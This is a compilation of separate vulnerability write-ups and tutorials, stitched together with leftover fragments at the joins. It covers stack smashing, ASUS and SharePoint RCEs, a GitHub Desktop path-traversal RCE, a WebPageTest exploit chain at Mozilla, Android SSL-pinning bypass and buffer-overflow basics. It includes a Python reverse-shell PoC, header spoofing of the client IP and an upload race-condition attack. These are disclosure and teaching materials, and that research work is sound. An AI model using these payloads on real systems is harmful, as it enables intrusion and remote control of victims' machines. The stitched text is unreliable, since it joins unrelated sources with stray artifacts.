in gcc was able to allow us to detect the smashing attemp. This effectively terminates the program and prevents the attack. Here is a screen dump: *** stack smashing detected ***: ./stack terminated ======= Backtrace: ========= /lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xb7f240e5] /lib/i386-linux-gnu/libc.so.6(+0x10409a)[0xb7f2409a] ./stack[0x8048513] [0xbffff33c] [0x2f6850c0] ======= Memory map: ======== 08048000-08049000 r-xp 00000000 08:01 1582540 /home/***/Documents/stack 08049000-0804a000 r-xp 00000000 08:01 1582540 /home/***/Documents/stack 0804a000-0804b000 rwxp 00001000 08:01 1582540 /home/***/Documents/stack 0804b000-0806c000 rwxp 00000000 00:00 0 [heap] b7def000-b7e0b000 r-xp 00000000 08:01 2360149 /lib/i386-linux-gnu/libgcc_s.so.1 b7e0b000-b7e0c000 r-xp 0001b000 08:01 2360149 /lib/i386-linux-gnu/libgcc_s.so.1 b7e0c000-b7e0d000 rwxp 0001c000 08:01 2360149 /lib/i386-linux-gnu/libgcc_s.so.1 b7e1f000-b7e20000 rwxp 00000000 00:00 0 b7e20000-b7fc3000 r-xp 00000000 08:01 2360304 /lib/i386-linux-gnu/libc-2.15.so b7fc3000-b7fc5000 r-xp 001a3000 08:01 2360304 /lib/i386-linux-gnu/libc-2.15.so b7fc5000-b7fc6000 rwxp 001a5000 08:01 2360304 /lib/i386-linux-gnu/libc-2.15.so b7fc6000-b7fc9000 rwxp 00000000 00:00 0 b7fd9000-b7fdd000 rwxp 00000000 00:00 0 b7fdd000-b7fde000 r-xp 00000000 00:00 0 [vdso] b7fde000-b7ffe000 r-xp 00000000 08:01 2364405 /lib/i386-linux-gnu/ld-2.15.so b7ffe000-b7fff000 r-xp 0001f000 08:01 2364405 /lib/i386-linux-gnu/ld-2.15.so b7fff000-b8000000 rwxp 00020000 08:01 2364405 /lib/i386-linux-gnu/ld-2.15.so bffdf000-c0000000 rwxp 00000000 00:00 0 [stack] Aborted (core dumped) How to contact me Ways to get in touch with me: Twitter: https://www.twitter.com/nicolaspapernot Webpage: https://www.papernot.fr License This was adapted from a SEED lab.

February 09, 2019 - 1 min Hello folks! Today I want to talk about ASUS RCE vulnerability on rma.asus-europe.eu domain. I was trying to fill out service apply form for my personal laptop. I had a screen issue. I realised that there is an upload part to upload some warranty documents. I was trying to bypass upload restrictions by editing request. I couldnt figure it out but it happened very fast! Because interestingly, Asus didn’t implement serious restrictions on upload part. Most of the rules were on front end part which are easy to bypass. Thanks to burp and our old null byte friend, I was able to bypass all upload restriction. The next mission was to find upload directory. I need to say thanks to ASUS developers, they helped me a lot. The directory was /uploads which is very easy to predict. Achievement unlocked! - ASUS RCE It is Microsoft-IIS 8.5, help me ASP! I used a very basic asp rce script for Microsoft-IIS 8.5 and it worked like a charm! I did not want to go further and quickly sent an email to the security@asus.com but they didnt give a shit for a while. After that they just fixed the issues and close it. There were no response to me. I sent lots of mails about issue and they decided to add my name on HoF list. But they didnt lol. I was need to create huge email traffic to do so. ASUS acts very rude about security, I am not happy. But finally, I’ve added HoF list by ASUS. « CyberArk EPM Privilege Escalation Vulnerability - CVE-2018-13052 Senate.gov open redirect vulnerability » Related Posts CyberArk EPM Privilege Escalation Vulnerability - CVE-2018-13052 CyberArk EPM file block bypass - CVE-2018-14894 First Touch Games database information leak ITSLEARNING VULNERABILITY STORIES - One more stored XSS ITSLEARNING XSS PART 2 Tweet Share rss facebook twitter github mail instagram linkedin Mustafa Kemal Can © rss facebook twitter github mail instagram linkedin"}

Menu Home Advisories Privacy Policy Bug Bounty Invites! SecProject Story of my two (but actually three) RCEs in SharePoint in 2018 I became interested in looking at .NET deserialization issues in Jan. 2018 when a work colleague (Daniele Costa) asked me whether I had worked with the ysoserial.net tool before (and the answer was a no!). I began to like it more and more just by looking at the generated payloads, and then by reading its useful references. It even answered one of the questions that I always had in mind: “ How can ViewState or EventValidation without MAC enabled lead to remote code execution? “; the answer was simple: “deserialization attacks using ObjectStateFormatter or LosFormatter”. I know I was late to the party but as the attack surface is huge, I managed to exploit a number applications including SharePoint without really having deep knowledge in this area. As mentioned in the MS 2018 Q4 – Top 5 Bounty Hunter for 2 RCEs in SharePoint Online post, I managed to exploit two RCEs in SharePoint Workflows that also affected SharePoint on-prem versions. Therefore, in addition to having a good bounty for the online version, I managed to get two CVEs in .NET Framework (CVE-2018-8284 and CVE-2018-8421). Details of these vulnerabilities were published in NCC Group’s website as can be seen here: Bypassing Workflows Protection Mechanisms – Remote Code Execution on SharePoint ( view PDF ) Bypassing Microsoft XOML Workflows Protection Mechanisms using Deserialisation of Untrusted Data ( view PDF ) The first one was a logical issue in the Workflows. This was the one with the epic Microsoft’s response: Technical Advisory: Bypassing Workflows Protection Mechanisms – Remote Code Execution on SharePoint Written by: @irsdl https://t.co/LbwofvDL1y pic.twitter.com/l7HlVmT9u0 — NCC Group Research & Technology (@NCCGroupInfosec) August 30, 2018 The second one however was a deserialisation issue that was not fully exploited on SharePoint until after the advisory was published. Here is the short story: If only there were some bounty left for a working RCE exploit … — Alvaro Muñoz (@pwntester) November 9, 2018 Which was shortly followed by a fully working exploit thanks to Alvaro’s tip: Blog post on XOML deserialization has been updated with a working SharePoint RCE (using CVE-2018-8421): https://t.co/8YlDorMvnR @NCCGroupInfosec @pwntester pic.twitter.com/eUPTiyl0Ul — Soroush Dalili (@irsdl) November 12, 2018 It should be noted that Microsoft had already given me the maximum bounty that is for an RCE issue even for the second one. Finally, 2018 was a good year for me on SharePoint finding 3 RCEs in it. If you are wondering what the third one was, the clue is in the ASP.NET resource files (.RESX) and deserialization issues post. I did not receive any bounty for it despite having a reverse shell on the Microsoft SharePoint Online server due to an ongoing engagement my company (NCC Group) had with them at the same time (unlucky me but I was lucky enough to be compensated by my company as they recognised my efforts).

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub Desktop RCE (OSX) - 0xacb 0xacb Posts Projects About Contact GitHub Desktop RCE (OSX) Bug Bounty Writeup Posted by 0xacb on December 04, 2018 · 6 mins read I was invited to H1-702 2018, a HackerOne live-hacking event in Las Vegas that paid over $500k dollars in bounties . One of the targets of this event was GitHub. I like to hack software I use everyday, because I already know lots of features in advance, so I felt GitHub would be a good target. I started playing with GitHub Desktop and found a way to achieve RCE in OSX. But, guess what? It was out of scope for the event! It’s also out of scope in the normal program , but you can read that “occasionally, exceptional reports are rewarded at our discretion on a case by case basis.” The Vulnerability You can find the public list of bug bounty hunters and vulnerabilities here: https://bounty.github.com/ I noticed that @zhuowei reported an RCE on GitHub Desktop last year: If something like this was reported previously, it’s probably safe to say that it is fixed. Maybe not in every OS? Well, you probably have seen this before: I started playing with x-github-client:// , which is the URI scheme used by GitHub Desktop. One of the supported actions in this URL is openRepo , which automatically opens a given file in a repository. If this repo doesn’t exist, the app prompts the user to clone it and then opens the file. Example: x-github-client://openRepo/https://github.com/github/training-kit?branch=master&filepath=README.md What if… we provide a filepath parameter like: \"../../../../../../../../../../../Applications/Calculator.app\" ? Opening an URL like this would pop a calculator, so at this point it was possible to escape the repository directory, and arbitrary apps or files could be opened in the filesystem. However, a respository can contain an app for OSX, which is basically a directory with the Application Bundle. First, I thought that OSX would be able to detect that this app was downloaded from the Internet. Since the app is cloned through Git the OS will not prompt the user to confirm this action. What’s the root cause of the problem? app/src/main-process/main.ts ... ipcMain . on ( ' show-item-in-folder ' , ( event : Electron . IpcMessageEvent , { path }: { path : string }) => { ... if ( stats . isDirectory ()) { openDirectorySafe ( path ) } else { shell . showItemInFolder ( path ) } ... app/src/main-process/shell.ts ... import { shell } from ' electron ' ; export function openDirectorySafe ( path : string ) { if ( __DARWIN__ ) { const directoryURL = Url . format ({ pathname : path , protocol : ' file: ' , slashes : true , }) shell . openExternal ( directoryURL ) } else { shell . openItem ( path ) } } In OSX, the directory path is converted to a file:/// URL and then the Electron function shell.openExternal() opens the URL in the desktop’s default manner. The PoC I built a simple reverse shell application for OSX with Pyinstaller and pushed it to my github-desktop-poc repository: import socket , subprocess , os ; os . system ( \" open -a calculator.app \" ) s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \" localhost \" , 1337 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \" /bin/sh \" , \" -i \" ]); If github-desktop-poc wasn’t cloned previously, the user would need to click clone , but the specified file would be opened immediately after this action. Otherwise, no interaction required, as shown in the second part of the video PoC. The attack scenario: An attacker can include an OSX app on his repository and distribute an evil link, for example in a README.md or in the page of a given project. He/She would be able to achieve remote code execution on the machines of GitHub Desktop users on OSX. A one-click RCE has the following requirements: The evil repository is already cloned Trusting GitHub Desktop URLs - Always open these types of links in the associated app ✓ The Fix Timeline 2018/08/19 Reported to GitHub via HackerOne #397045 2018/08/20 Triaged 2018/08/25 Fixed - GitHub Desktop v1.3.4 released 2018/08/27 Resolved and bounty awarded 2018/08/27 H1-702 2018 Bonus: unlimited private repositories coupon ❤️ ← Previous Post Next Post → Copyright © 0xacb 2025"}

Research Labs ASM Roles Request a Demo Research Notes Security Research March 19, 2019 Discovering a zero day and getting code execution on Mozilla's AWS Network No items found. Creative Commons license When Assetnote Continuous Security (CS) monitors your attack surface, one of the things it looks for are instances of WebPageTest . WebPageTest is a website performance testing tool that lets you test network related metrics for any given URL/host. Although basic authentication can be enabled by modifying the settings.ini file, and is recommended to prevent any anonymous access. Most deployments of WebPageTest that Assetnote CS identifies are unauthenticated, and the array of testing tools provided by WebPageTest can be used offensively to gain access to internal resources by server-side request forgery (commonly known as SSRF, but for WebPageTest, it is a feature). In November 2017, Assetnote CS discovered the following assets on Mozillaâs AWS environment: wpt-vpn.stage.mozaws.net wpt1.dev.mozaws.net Both of these were instances of WebPageTest did not require authentication, and it was the first time Assetnote CS had detected it for a bug bounty. Working with Mathias , we audited the source code, and in just a few hours we were able to create an attack chain that led to remote-code execution. While it was a zero day at the time of discovery, we worked with the Mozilla and WebPageTest team on getting the vulnerability fixed upstream. The commit which patches the bugs outlined in this blog post was pushed in this commit , on the 17th of January, 2018. The first thing in the codebase that caught our attention was the ability to upload and extract arbitrary Zip files via <span class=\"code_single-line\">/www/work/workdone.php</span>. This script contained some logic to restrict access from sources other than 127.0.0.1, as seen from the code snippet below: ... !strcmp($_SERVER['REMOTE_ADDR'], \"127.0.0.1\") ... Weâll come back to that later. In the same file, we found another potential vector - logic to upload an arbitrary Zip and have it extracted to a known location: Lines 133 - 136: /www/work/workdone.php if (isset($_FILES['file']['tmp_name'])) { ExtractZipFile($_FILES['file']['tmp_name'], $testPath); CompressTextFiles($testPath); } If we could spoof our IP to come from 127.0.0.1, it seems like we could get code execution through this vector. However, we found that itâs not as straightforward as we thought it was, due to Line 321 in /www/work/workdone.php : SecureDir($testPath); The logic of the <span class=\"code_single-line\">SecureDir</span> function can be found on Lines 2322 - 2347 in /www/common_lib.inc : /** * Make sure there are no risky files in the given directory and make everything no-execute * * @param mixed $path */ function SecureDir($path) { $files = scandir($path); foreach ($files as $file) { $filepath = \"$path/$file\"; if (is_file($filepath)) { $parts = pathinfo($file); $ext = strtolower($parts['extension']); if (strpos($ext, 'php') === false && strpos($ext, 'pl') === false && strpos($ext, 'py') === false && strpos($ext, 'cgi') === false && strpos($ext, 'asp') === false && strpos($ext, 'js') === false && strpos($ext, 'rb') === false && strpos($ext, 'htaccess') === false && strpos($ext, 'jar') === false) { @chmod($filepath, 0666); } else { @chmod($filepath, 0666); // just in case the unlink fails for some reason unlink($filepath); } } elseif ($file != '.' && $file != '..' && is_dir($filepath)) { SecureDir($filepath); } } } Since the SecureDir function occurs later during the code flow, there is an exploitable race condition where the PHP files that are extracted to the webserver were accessible for a short period of time before being deleted. The first pre-requesite of the chain was rather easy, as a valid test ID was obtained by running a Traceroute on <span class=\"code_single-line\">https://google.com</span> through the WebPageTest interface on <span class=\"code_single-line\">wpt-vpn.stage.mozaws.net</span>: Running a traceroute using WebPageTest After running the traceroute, WebPageTest redirected us to a URL that contained the test ID used in later steps: http://wpt-vpn.stage.mozaws.net/result/ 171124_GW_9/ â But we still needed to somehow spoof that we are <span class=\"code_single-line\">127.0.0.1</span> in order to access the vulnerable functions in this script. We were able to meet this condition by exploiting the following logic: Line 70: /www/common.inc if (isset($_SERVER[\"HTTP_FASTLY_CLIENT_IP\"])) $_SERVER[\"REMOTE_ADDR\"] = $_SERVER[\"HTTP_FASTLY_CLIENT_IP\"]; This allowed us as remote users to arbitrarily set <span class=\"code_single-line\">$_SERVER[\"REMOTE_ADDR\"]</span> by sending a <span class=\"code_single-line\">FASTLY-CLIENT-IP</span> request header set to <span class=\"code_single-line\">127.0.0.1</span>. Combining all of these elements together, we were able to set up two Burp Intruder attacks to finally get code execution. One Burp Intruder attack was used to upload a malicious Zip file, and another attempted to access the extracted PHP file, while it existed on the system. Our solution to exploiting the race condition at the time was to simply up Burp Intruderâs threads to ~200. Today, using tools such as Turbo Intruder , due to the speed of the requests being sent, itâs possible to make this exploit much more reliable. We were able to use this technique to achieve code execution on Mozilla as seen in the screenshot below: phpinfo() output from wpt-vpn.stage.mozaws.net The Bugzilla report in which we first reported this vulnerability is now public, and can be viewed here . The report contains thorough reproduction steps that should be sufficient for testers wishing to recreate these bugs. We were awarded $500 as a part of Mozillaâs bug bounty program.

Neha Tariq 7 min read · Aug 15, 2020 -- Listen Share Press enter or click to view image in full size Introduction As a pentester developing new skills in different areas is very important as you might miss something crucial from one approach. Android pentesting is one of them, but it requires a dedicated environment and I will explain how to setup an easy one. So let’s begin! Table of contents: Setup android emulator (Genymotion) Configure Burp Suite CA certificate on device Frida to bypass SSL pinning Bytecode Viewer (for static analysis) Before installing emulator, I would recommend to install any Linux based distro or Santoku , which is especially designed for mobile pentesting. Installing Santoku is out of scope in this write-up, but you can follow up this guide to setup. 1. Genymotion When starting out learning, android emulators are the great way to get experience with a variety of devices having different API levels without costing much and free version of Genymotion provides exactly that with great User Experience and easy to configure nature. Note: VirtualBox is used as a core by genymotion to virtualize Android operating systems. So please install VirtualBox in your system in order to proceed: link Genymotion requires user registration to use its dashboard and for that first you need to create an account: link After completing your registration process download its installer from here and install it in your host computer. # Make it executable $- chmod +x genymotion-<version>-linux_x64.bin # Specify your path, here i am installing in user's home directory $- ./genymotion-<version>-linux_x64.bin -d ~/ Once Genymotion get installed now you can sign in using your credentials specified in the registration process and use its dashboard which looks like shown in Figure 1. Press enter or click to view image in full size Figure 1. Genymotion Dashboard Here I’ve installed two devices already, but you can install a new device by clicking on plus icon at the top right corner and selecting your desired template and for this example I will install Samsung Galaxy S9 (8.0 — API 26) Press enter or click to view image in full size Figure 2. Installing Samsung galaxy s9 Configuring Genymotion After initiating the device, there are a couple of things to consider: ARM translator: If some app contains ARM native code, then Genymotion will not be able to run the app as it consists of x86 (32-bit) architecture and will throw an error. You can avoid this problem by installing ARM translation library into emulated device: link Note: At this point of time this library only supports up to android version 8.0 so download right package according to your emulated device’s specifications. Saving APK (Android Package): Installing target apps into the emulated device becomes much easier by the Open Gapps widget present in a toolbar which you can access like shown in Figure 3. Figure 3. Installing Gapps in genymotion After its installation you can download your target apps directly from Play Store. But saving this apk into host system would be beneficial for main two reasons: No need to download the same version of app into different emulated devices having same specifications. Required for a decompiler in order to review the source code for static analysis. So how we can save them? Usually you have two ways to get apk either download it from sites like evozi or pull it using adb (Android debug bridge) Note: Genymotion have pre-installed this tool in its installation directory and mine is located in ~/genymotion/tools/ For this demonstration purpose I will use the Twitter Lite app: # Call package manager (pm) and filter out twitter's package name $- ./adb shell pm list packages | grep twitter # Check the absolute path $- ./adb shell pm path com.twitter.android.lite # Pull apk and rename to twitter_lite.apk $- ./adb pull /data/app/com.twitter.android.lite-somevalue.apk twitter_lite.apk Press enter or click to view image in full size Figure 4. Transferring apk from Genymotion to host computer Now just drag & drop these APKs into emulated devices. 2. Burp Suite I assume the reader already have installed burp suite if not then simply download its community version: link Here I will show you only how to configure with android emulated device. Android Nougat and above (API >= 24) only trusts system level CA (certificate authority) certificates for secure communications especially for WebView. You can read more from here: link So the easiest method to bypass this restriction is installing Burp CA’s certificate as the system trusted certificate and this method will also prevent us from setting a Lock screen PIN 😎 Steps: 1. Export burp CA into der format Press enter or click to view image in full size Figure 5. Exporting Burp CA’s cert with der format 2. Use Openssl to convert DER to PEM and rename to <cert-hash>.0 # Convert certificate format from DER to PEM $- openssl x509 -inform DER -in cacert.der -out cacert.pem # Display the \"hash\" of the certificate subject name $- openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1 # Move cert.pem and rename to <hash>.0 $- mv cacert.pem 9a5ba575.0 Press enter or click to view image in full size Figure 6. Prepare Burp CA using openssl Note: Use -subject_hash if your openssl <1.0 3 . Move certificate in emulated device using adb # Change /system partition into writable mode with remount $- ./adb remount # Transfer certificate $- ./adb push 9a5ba575.0 /system/etc/security/cacerts/ # Change its permissions $- ./adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0 # Reboot to let changes occur $- ./adb shell reboot Figure 7. Transferring certificate Now your certificate should be installed as a system-trusted CA certificate which you can confirm by navigating: Settings →Security & Location → Encryption & credentials → Trusted Credentials Press enter or click to view image in full size Figure 8. Confirming Burp’s certificate 4. Configure burp suite’s proxy Navigate to Proxy → Options → Proxy Listeners → Add Press enter or click to view image in full size Figure 9. Configure proxy in Burp Here I’ve bound port 8082 to my VirtualBox’s interface IP 5. On emulated device, configure WiFi settings. Navigate to WiFi → Long press WiFi name → Modify Network → Advanced Options → Change proxy None to Manual Figure 10. Configure WiFi network After this you can see network traffic in burp’s history Press enter or click to view image in full size Figure 11. Intercepting traffic 3. Frida Basically Frida is a dynamic code instrumentation toolkit which lets you dynamically inject snippets of code into running processes of the app in order to change its behavior and this is exactly what we need to bypass SSL pinning but now you might be wondering what’s that? Well, SSL pinning is a technique used in applications as an additional security layer for application traffic in order to prevent attacks like MitM (man-in-the-middle) and this will not allow burp to intercept the traffic unless we use tools like Frida to hook our specific code which bypass this functionality. Installation Install frida-tools with pip3 in host computer using cli $- pip3 install frida-tools 2. Download only x86 version of Frida server because virtual devices by Genymotion are x86-based which you can verify like shown in Figure 12. Figure 12. Samsung galaxy s9 (x86) arch Download link # Downloading using wget as an example $- wget https://github.com/frida/frida/releases/download/<version>/frida-server-<version>-android-x86.xz # Decompress using unxz $- unxz frida-server-<version>-android-x86.xz # Rename for ease $- mv frida-server-<version>-x86.xz frida-server # Transfer into the emulated device using adb $- ./adb push ~/Downloads/frida-server /data/local/tmp # Change its permissions $- ./adb shell chmod 755 /data/local/tmp/frida-server # Run Frida-server in the background $- ./adb shell /data/local/tmp/frida-server & Now, after setting up Frida server, we will be able to use our scripts but for that first we need to find APK’s name which you can find by either way # Old method using pm $- ./adb shell pm list packages | grep someapp # Another way using Frida but for this app first need to be started $- frida-ps -U | grep someapp For this demonstration purpose my target is Skrill and i am using this bypass script, simply save this into a js file Now lets see if Skrill is throwing any SSL error Press enter or click to view image in full size Figure 13. Skrill is using SSL pinning As expected it does, now use Frida with a bypass script to intercept network traffic Press enter or click to view image in full size Figure 14. Bypass successful And as you can see now we can continue our testing after successful SSL pinning bypassed using FRIDA 😃 4. Bytecode Viewer Static analysis is a straightforward process to look how an application performs by reviewing its source code. However decompiling its source code can be hard and for this purpose there are some decompilers like jadx But I personally liked Bytecode Viewer due to its wide range of different Java decompilers, two bytecode editors and many other features. Download link After downloading, simply run the decompiler and drag & drop your files into the Files section to decompile. Press enter or click to view image in full size Figure 15. Running Bytecode Viewer That’s it for now 😃 Hope this make some of your doubts clear and you are able to create your own android LAB. Happy Pentesting!

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStack-Based Buffer Overflow Attacks: Explained | Rapid7 Blog Platform Services Resources Partners Company Request Demo Back to Blog Vulnerabilities and Exploits Stack-Based Buffer Overflow Attacks: Explained and Examples Brendan Watters Feb 19, 2019 | Last updated on Nov 28, 2023 | xx min read What are buffer overflow attacks? Stack-based buffer overflow exploits are likely the shiniest and most common form of exploit for remotely taking over the code execution of a process. These exploits were extremely common 20 years ago, but since then, a huge amount of effort has gone into mitigating stack-based overflow attacks by operating system developers, application developers, and hardware manufacturers, with changes even being made to the standard libraries developers use. Below, we will explore how stack-based overflows work and detail the mitigation strategies that are put in place to try to prevent them. Deep dive on stack-based buffer overflow attacks Understanding stack-based overflow attacks involves at least a basic understanding of computer memory. Memory in a computer is simply a storage place for data and instructions—data for storing numbers, letters, images, and anything else, and instructions that tell the computer what to do with the data. Both are stored in the same memory because memory was prohibitively expensive in the early days of computing, and reserving it for one type of storage or another was wasteful. Such an approach where data and instructions are stored together is known as a Von Neumann architecture. It’s still in use in most computers to this day, though as you will see, it is not without complications. On the bright side, while security was not a driving factor in early computer and software design, engineers realized that changing running instructions in memory was a bad idea, so even as long ago as the ‘90s, standard hardware and operating systems were doing a good job of preventing changes to instructional memory. Unfortunately, you don’t really need to change instructions to change the behavior of a running program, and with a little knowledge, writeable data memory provides several opportunities and methods for affecting instruction execution. Take this particularly contrived example: #include #include #include int main(){ char realPassword[20]; char givenPassword[20]; strncpy(realPassword, \"ddddddddddddddd\", 20); gets(givenPassword); if (0 == strncmp(givenPassword, realPassword, 20)){ printf(\"SUCCESS!\\n\"); }else{ printf(\"FAILURE!\\n\"); } raise(SIGINT); printf(\"givenPassword: %s\\n\", givenPassword); printf(\"realPassword: %s\\n\", realPassword); return 0; } If you don’t know the C programming language, that’s fine. The interesting thing about this program is that it creates two buffers in memory called realPassword and givenPassword as local variables. Each buffer has space for 20 characters. When we run the program, space for these local variables is created in-memory and specifically stored on the stack with all other local variables (and some other stuff). The stack is a very structured, sequential memory space, so the relative distance between any two local variables in-memory is guaranteed to be relatively small. After this program creates the variables, it populates the realPassword value with a string, then prompts the user for a password and copies the provided password into the givenPassword value. Once it has both passwords, it compares them. If they match, it prints “SUCCESS!” If not, it prints “FAILURE!” Here’s an example run: msfuser@ubuntu:~$ ./example.elf test FAILURE! givenPassword: test realPassword: ddddddddddddddd This is exactly as we’d expect. The password we entered does not match the expected password. There is a catch here: The programmer (me) made several really bad mistakes, which we will talk about later. Before we cover that, though, let’s open a debugger and peek into memory to see what the stack looks like in memory while the program is executing: msfuser@ubuntu:~$ gdb example.elf . . . (gdb) run Starting program: /home/msfuser/example.elf aaaaaaaaaaaaaaaa FAILURE! Program received signal SIGINT, Interrupt. 0x00007ffff7a42428 in __GI_raise (sig=2) at ../sysdeps/unix/sysv/linux/raise.c:54 54 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory. (gdb) At this point, the program has taken in the data and compared it, but I added an interrupt in the code to stop it before exiting so we could “look” at the stack. Debuggers let us see what the program is doing and what the memory looks like on a running basis. In this case, we are using the GNU Debugger (GDB). The GDB command ‘info frame’ allows us to find the location in memory of the local variables, which will be on the stack: (gdb) info frame Stack level 0, frame at 0x7fffffffdde0: rip = 0x7ffff7a42428 in __GI_raise (../sysdeps/unix/sysv/linux/raise.c:54); saved rip = 0x400701 called by frame at 0x7fffffffde30 source language c. Arglist at 0x7fffffffddd0, args: sig=2 Locals at 0x7fffffffddd0, Previous frame's sp is 0x7fffffffdde0 Saved registers: rip at 0x7fffffffddd8 (gdb) Now that we know where the local variables are, we can print that area of memory: (gdb) x/200x 0x7fffffffddd0 0x7fffffffddd0: 0x00000000 0x00000000 0x00400701 0x00000000 0x7fffffffdde0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffddf0: 0x00000000 0x00000000 0x00000000 0x00000000 0x7fffffffde00: 0x64646464 0x64646464 0x64646464 0x00646464 0x7fffffffde10: 0x00000000 0x00007fff 0x00000000 0x00000000 . . . As mentioned, the stack is sequentially stored data. If you know ASCII, then you know the letter ‘a’ is represented in memory by the value 0x61 and the letter ‘d’ is 0x64. You can see above that they are right next to each other in memory. The realPassword buffer is right after the givenPassword buffer. Now, let’s talk about the mistakes that the programmer (me) made. First, developers should never, ever, ever use the gets function because it does not check to make sure that the size of the data it reads in matches the size of the memory location it uses to save the data. It just blindly reads the text and dumps it into memory. There are many functions that do the exact same thing—these are known as unbounded functions because developers cannot predict when they will stop reading from or writing to memory. Microsoft even has a web page documenting what it calls “banned” functions, which includes these unbounded functions. Every developer should know these functions and avoid them, and every project should automatically audit source code for them. These functions all date from a period where security was not as imperative as it is today. These functions must continue to be supported because pulling support would break many legacy programs, but they should not be used in any new programs and should be removed during maintenance of old programs. Taking a look at the hack We have looked at the stack, noticed that the buffers are located consecutively in memory, and talked about why gets is a bad function. Let’s now abuse gets and see whether we can hack the planet program. Since we know gets has a problem with reading more than it should, the first thing to try is to give it more data than the buffer can hold. The buffers are 20 characters, so let’s start with 30 characters: msfuser@ubuntu:~$ gdb example.elf . . . (gdb) run Starting program: /home/msfuser/example.elf aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa FAILURE! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: ddddddddddddddd Program received signal SIGINT, Interrupt. 0x00007ffff7a42428 in __GI_raise (sig=2) at ../sysdeps/unix/sysv/linux/raise.c:54 54 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory. (gdb) info frame Stack level 0, frame at 0x7fffffffdde0: rip = 0x7ffff7a42428 in __GI_raise (../sysdeps/unix/sysv/linux/raise.c:54); saved rip = 0x40072d called by frame at 0x7fffffffde30 source language c. Arglist at 0x7fffffffddd0, args: sig=2 Locals at 0x7fffffffddd0, Previous frame's sp is 0x7fffffffdde0 Saved registers: rip at 0x7fffffffddd8 (gdb) x/200x 0x7fffffffddd0 0x7fffffffddd0: 0x00000000 0x00000000 0x0040072d 0x00000000 0x7fffffffdde0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffddf0: 0x61616161 0x61616161 0x61616161 0x00006161 0x7fffffffde00: 0x64646464 0x64646464 0x64646464 0x00646464 0x7fffffffde10: 0x00000000 0x00007fff 0x00000000 0x00000000 0x7fffffffde20: 0x00400740 0x00000000 0xf7a2d830 0x00007fff 0x7fffffffde30: 0x00000000 0x00000000 0xffffdf08 0x00007fff We can see clearly that there are 30 instances of ‘a’ in memory, despite us only specifying space for 20 characters. We have overflowed the buffer, but not enough to do anything. Let’s keep trying and try 40 instances of ‘a.’ msfuser@ubuntu:~$ gdb example.elf . . . (gdb) run Starting program: /home/msfuser/example.elf aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa FAILURE! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: aaaaaaaa Program received signal SIGINT, Interrupt. 0x00007ffff7a42428 in __GI_raise (sig=2) at ../sysdeps/unix/sysv/linux/raise.c:54 54 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory. . . . (gdb) x/200x 0x7fffffffddd0 0x7fffffffddd0: 0x00000000 0x00000000 0x0040072d 0x00000000 0x7fffffffdde0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffddf0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffde00: 0x61616161 0x61616161 0x64646400 0x00646464 0x7fffffffde10: 0x00000000 0x00007fff 0x00000000 0x00000000 0x7fffffffde20: 0x00400740 0x00000000 0xf7a2d830 0x00007fff The first thing to notice is that we went far enough to pass through the allotted space for givenPassword and managed to alter the value of realPassword, which is a huge success. We did not alter it enough to fool the program, though. Since we are comparing 20 characters and we wrote eight characters to the realPassword buffer, we need to write 12 more characters. So, let’s try again, but with 52 instances of ‘a’ this time: msfuser@ubuntu:~$ gdb example.elf . . . (gdb) run Starting program: /home/msfuser/example.elf aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa SUCCESS! givenPassword: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa realPassword: aaaaaaaaaaaaaaaaaaaa Program received signal SIGINT, Interrupt. 0x00007ffff7a42428 in __GI_raise (sig=2) at ../sysdeps/unix/sysv/linux/raise.c:54 54 ../sysdeps/unix/sysv/linux/raise.c: No such file or directory. (gdb) info frame Stack level 0, frame at 0x7fffffffdde0: rip = 0x7ffff7a42428 in __GI_raise (../sysdeps/unix/sysv/linux/raise.c:54); saved rip = 0x40072d called by frame at 0x7fffffffde30 source language c. Arglist at 0x7fffffffddd0, args: sig=2 Locals at 0x7fffffffddd0, Previous frame's sp is 0x7fffffffdde0 Saved registers: rip at 0x7fffffffddd8 (gdb) x/200x 0x7fffffffddd0 0x7fffffffddd0: 0x00000000 0x00000000 0x0040072d 0x00000000 0x7fffffffdde0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffddf0: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffde00: 0x61616161 0x61616161 0x61616161 0x61616161 0x7fffffffde10: 0x61616161 0x00007f00 0x00000000 0x00000000 Success! We overflowed the buffer for givenPassword and the data went straight into realPassword, so that we were able to alter the realPassword buffer to whatever we wanted before the check took place. This is an example of a buffer (or stack) overflow attack. In this case, we used it to alter variables within a program, but it can also be used to alter metadata used to track program execution. Altering metadata Using stack overflow attacks against program metadata to affect code execution is not much different than the above example. The key is understanding the concept of a return value. Like us, computers do a lot of things at once and will stop working on one thing to do another before returning to the original task. When the computer executes instructions located somewhere else in the instruction memory, it stores a note of where it was before it starts executing so that it knows where to return when it finishes the new task. That note—called the return address—is simply the address in instructional memory where it returns and starts executing instructions. The computer is brilliant, and if you can change the value of the return address, you can send it wherever you like. Exploits will often write the instructions in the same buffer they overflow and then point execution back to the buffer itself, which allows an attacker to hand a program code and then force it to execute the code. One caveat is that none of these examples will work on remotely modern operating systems anymore. Operating system developers, application developers, hardware engineers, and even compilers have all reacted and made performing stack overflow attacks much harder. What’s being done to mitigate these exploits? It has been nearly 20 years since 